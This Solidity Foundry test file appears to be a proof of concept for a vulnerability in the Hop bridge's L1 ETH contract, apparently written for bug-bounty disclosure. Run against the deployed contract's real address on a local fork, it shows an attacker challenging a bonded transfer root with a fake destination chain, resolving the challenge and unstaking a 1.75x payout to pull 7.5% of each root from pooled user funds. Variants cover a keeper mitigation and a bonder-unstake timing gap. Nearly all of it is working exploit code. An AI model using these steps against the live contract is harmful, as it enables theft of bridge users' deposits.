// SAFE, read-only, LOCAL FORK ONLY. Uses test cheatcodes (vm.*) that do nothing
// on a real network. No mainnet state is touched.
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

interface IHopL1Eth {
    function stake(address bonder, uint256 amount) external payable;
    function unstake(uint256 amount) external;
    function bondTransferRoot(bytes32 rootHash, uint256 destinationChainId, uint256 totalAmount) external;
    function challengeTransferBond(bytes32 rootHash, uint256 originalAmount, uint256 destinationChainId)
        external
        payable;
    function resolveChallenge(bytes32 rootHash, uint256 originalAmount, uint256 destinationChainId) external;
    function getCredit(address bonder) external view returns (uint256);
    function getDebitAndAdditionalDebit(address bonder) external view returns (uint256);
    function getIsBonder(address maybeBonder) external view returns (bool);
    function challengePeriod() external view returns (uint256);
    function challengeResolutionPeriod() external view returns (uint256);
    function getChallengeAmountForTransferAmount(uint256 amount) external view returns (uint256);
    function getTransferRootId(bytes32 rootHash, uint256 totalAmount) external pure returns (bytes32);
    function transferRootCommittedAt(uint256 destinationChainId, bytes32 transferRootId)
        external
        view
        returns (uint256);
    function getTransferId(
        uint256 chainId,
        address recipient,
        uint256 amount,
        bytes32 transferNonce,
        uint256 bonderFee,
        uint256 amountOutMin,
        uint256 deadline
    ) external pure returns (bytes32);
    function getTransferRoot(bytes32 rootHash, uint256 totalAmount)
        external
        view
        returns (uint256 total, uint256 amountWithdrawn, uint256 createdAt);
    function withdraw(
        address recipient,
        uint256 amount,
        bytes32 transferNonce,
        uint256 bonderFee,
        uint256 amountOutMin,
        uint256 deadline,
        bytes32 rootHash,
        uint256 transferRootTotalAmount,
        uint256 transferIdTreeIndex,
        bytes32[] calldata siblings,
        uint256 totalLeaves
    ) external;
    function getTimeSlot(uint256 time) external pure returns (uint256);
    function getBondForTransferAmount(uint256 amount) external pure returns (uint256);
}

contract HopChallengeDestPoC is Test {
    IHopL1Eth constant BRIDGE = IHopL1Eth(0xb8901acB165ed027E32754E0FFe830802919727f);
    address constant BONDER = 0x710bDa329b2a6224E4B44833DE30F38E7f81d564;
    address attacker = address(0xA11CE);

    uint256 constant ROOT_AMOUNT = 10 ether;
    uint256 constant FAKE_DEST = 999;

    function test_wrongDestChallengeExtractsFromPool() public {
        console.log("pool ETH start", address(BRIDGE).balance);
        console.log("bonder?", BRIDGE.getIsBonder(BONDER));

        uint256 stakeAmt = 12 ether;
        vm.deal(address(this), stakeAmt);
        BRIDGE.stake{value: stakeAmt}(BONDER, stakeAmt);

        bytes32 root = keccak256("hop-wrong-dest-poc");
        vm.prank(BONDER);
        BRIDGE.bondTransferRoot(root, 1, ROOT_AMOUNT);

        uint256 poolAfterBond = address(BRIDGE).balance;

        uint256 challengeStake = BRIDGE.getChallengeAmountForTransferAmount(ROOT_AMOUNT);
        vm.deal(attacker, challengeStake);
        uint256 attBefore = attacker.balance;

        vm.prank(attacker);
        BRIDGE.challengeTransferBond{value: challengeStake}(root, ROOT_AMOUNT, FAKE_DEST);

        vm.warp(block.timestamp + BRIDGE.challengeResolutionPeriod() + 1);

        vm.prank(attacker);
        BRIDGE.resolveChallenge(root, ROOT_AMOUNT, FAKE_DEST);

        uint256 expectedCredit = (challengeStake * 7) / 4;
        vm.prank(attacker);
        BRIDGE.unstake(expectedCredit);

        uint256 attAfter = attacker.balance;
        uint256 poolAfter = address(BRIDGE).balance;
        uint256 net = expectedCredit - challengeStake;
        console.log("attacker gained", attAfter - attBefore);
        console.log("pool lost after bond", poolAfterBond - poolAfter);
        console.log("expected net (7.5% of root)", net);

        assertEq(attAfter - attBefore, net, "attacker net == 7.5% of root");
        // 7.5% to attacker + 2.5% burned to 0xdead
        assertEq(poolAfterBond - poolAfter, challengeStake, "pool loses 10% of root");
    }

    // Keeper bound: if someone resolves with the dest that was actually confirmed,
    // the fake-dest challenge is treated as invalid and the attacker does not profit.
    function test_keeperResolveWithConfirmedDestBlocksExtract() public {
        uint256 stakeAmt = 12 ether;
        vm.deal(address(this), stakeAmt);
        BRIDGE.stake{value: stakeAmt}(BONDER, stakeAmt);

        bytes32 root = keccak256("hop-wrong-dest-keeper");
        vm.prank(BONDER);
        BRIDGE.bondTransferRoot(root, 1, ROOT_AMOUNT);

        uint256 challengeStake = BRIDGE.getChallengeAmountForTransferAmount(ROOT_AMOUNT);
        vm.deal(attacker, challengeStake);
        uint256 attBefore = attacker.balance;

        vm.prank(attacker);
        BRIDGE.challengeTransferBond{value: challengeStake}(root, ROOT_AMOUNT, FAKE_DEST);

        // Simulate confirm on the real dest (chain 1). Slot 7 is transferRootCommittedAt.
        bytes32 rootId = BRIDGE.getTransferRootId(root, ROOT_AMOUNT);
        bytes32 inner = keccak256(abi.encode(uint256(1), uint256(7)));
        bytes32 cell = keccak256(abi.encode(rootId, inner));
        vm.store(address(BRIDGE), cell, bytes32(uint256(block.timestamp)));
        require(BRIDGE.transferRootCommittedAt(1, rootId) > 0, "confirm slot wrong");

        vm.warp(block.timestamp + BRIDGE.challengeResolutionPeriod() + 1);

        uint256 creditBefore = BRIDGE.getCredit(attacker);
        // Keeper resolves with the confirmed dest, not 999.
        BRIDGE.resolveChallenge(root, ROOT_AMOUNT, 1);
        uint256 creditAfter = BRIDGE.getCredit(attacker);

        // Invalid-challenge + bond-after-commit path: attacker credit does not
        // increase by the 1.75x payout. Stake is either returned or given to bonder.
        assertLt(creditAfter - creditBefore, (challengeStake * 7) / 4, "no 1.75x payout");
        assertEq(attacker.balance, attBefore - challengeStake, "stake still in contract until unstake");
    }

    // Worse case: dest=1 root still pays the full user withdraw after a fake-dest
    // challenge. Same ETH pot pays 100% to the "user" plus 10% (7.5 steal + 2.5 burn).
    // Still bounded per root. Not a full-pool Critical.
    function test_l1RootStillPaysUsersPlusFakeDestExtract() public {
        uint256 stakeAmt = 12 ether;
        vm.deal(address(this), stakeAmt);
        BRIDGE.stake{value: stakeAmt}(BONDER, stakeAmt);

        address user = address(0xBEEF);
        bytes32 nonce = keccak256("nonce-1");
        bytes32 transferId = BRIDGE.getTransferId(1, user, ROOT_AMOUNT, nonce, 0, 0, 0);
        // Single-leaf tree: root == leaf.
        bytes32 root = transferId;

        vm.prank(BONDER);
        BRIDGE.bondTransferRoot(root, 1, ROOT_AMOUNT);

        uint256 poolAfterBond = address(BRIDGE).balance;
        uint256 userBefore = user.balance;

        bytes32[] memory siblings = new bytes32[](0);
        BRIDGE.withdraw(user, ROOT_AMOUNT, nonce, 0, 0, 0, root, ROOT_AMOUNT, 0, siblings, 1);
        assertEq(user.balance - userBefore, ROOT_AMOUNT, "user still got full root");

        (uint256 total, uint256 withdrawn,) = BRIDGE.getTransferRoot(root, ROOT_AMOUNT);
        assertEq(total, ROOT_AMOUNT);
        assertEq(withdrawn, ROOT_AMOUNT);

        uint256 challengeStake = BRIDGE.getChallengeAmountForTransferAmount(ROOT_AMOUNT);
        vm.deal(attacker, challengeStake);
        uint256 attBefore = attacker.balance;
        vm.prank(attacker);
        BRIDGE.challengeTransferBond{value: challengeStake}(root, ROOT_AMOUNT, FAKE_DEST);

        vm.warp(block.timestamp + BRIDGE.challengeResolutionPeriod() + 1);
        vm.prank(attacker);
        BRIDGE.resolveChallenge(root, ROOT_AMOUNT, FAKE_DEST);
        vm.prank(attacker);
        BRIDGE.unstake((challengeStake * 7) / 4);

        uint256 extra = attacker.balance - attBefore;
        uint256 poolLost = poolAfterBond - address(BRIDGE).balance;
        console.log("user withdrew", ROOT_AMOUNT);
        console.log("attacker extra", extra);
        console.log("pool lost vs post-bond", poolLost);

        assertEq(extra, (ROOT_AMOUNT * 75) / 1000, "still only 7.5% extra");
        // 10 ETH user + 1 ETH (0.75 attacker + 0.25 burn) = 11 ETH from post-bond pot
        assertEq(poolLost, ROOT_AMOUNT + challengeStake, "107.5%+burn of this root, not the whole pool");
        assertGt(address(BRIDGE).balance, 500 ether, "rest of the 603 ETH pot remains");
    }

    // Slot-gap: after 24h additionalDebit drops but challenge is still allowed.
    // A bonder can unstake the 110% lock, then a fake-dest challenge still pays
    // 7.5% from remaining user deposits. Needs the allowlisted bonder to unstake.
    function test_slotGapUnstakeThenFakeDestStillExtracts() public {
        uint256 stakeAmt = 12 ether;
        vm.deal(address(this), stakeAmt);
        BRIDGE.stake{value: stakeAmt}(BONDER, stakeAmt);

        bytes32 root = keccak256("slot-gap-root");
        vm.prank(BONDER);
        BRIDGE.bondTransferRoot(root, 1, ROOT_AMOUNT);

        uint256 bondAmt = BRIDGE.getBondForTransferAmount(ROOT_AMOUNT);
        uint256 availBefore = BRIDGE.getCredit(BONDER) - BRIDGE.getDebitAndAdditionalDebit(BONDER);
        assertLt(availBefore, stakeAmt, "bond should consume additionalDebit");

        vm.warp(block.timestamp + BRIDGE.challengePeriod());
        uint256 availAfter = BRIDGE.getCredit(BONDER) - BRIDGE.getDebitAndAdditionalDebit(BONDER);
        assertGe(availAfter, bondAmt, "24h later the bond dropped out of additionalDebit");

        uint256 bonderEthBefore = BONDER.balance;
        vm.prank(BONDER);
        BRIDGE.unstake(bondAmt);
        assertEq(BONDER.balance - bonderEthBefore, bondAmt, "bonder recovered the 110% lock");

        uint256 challengeStake = BRIDGE.getChallengeAmountForTransferAmount(ROOT_AMOUNT);
        vm.deal(attacker, challengeStake);
        uint256 attBefore = attacker.balance;
        vm.prank(attacker);
        BRIDGE.challengeTransferBond{value: challengeStake}(root, ROOT_AMOUNT, FAKE_DEST);

        vm.warp(block.timestamp + BRIDGE.challengeResolutionPeriod() + 1);
        vm.prank(attacker);
        BRIDGE.resolveChallenge(root, ROOT_AMOUNT, FAKE_DEST);
        vm.prank(attacker);
        BRIDGE.unstake((challengeStake * 7) / 4);

        assertEq(attacker.balance - attBefore, (ROOT_AMOUNT * 75) / 1000, "extract still 7.5%");
    }
}
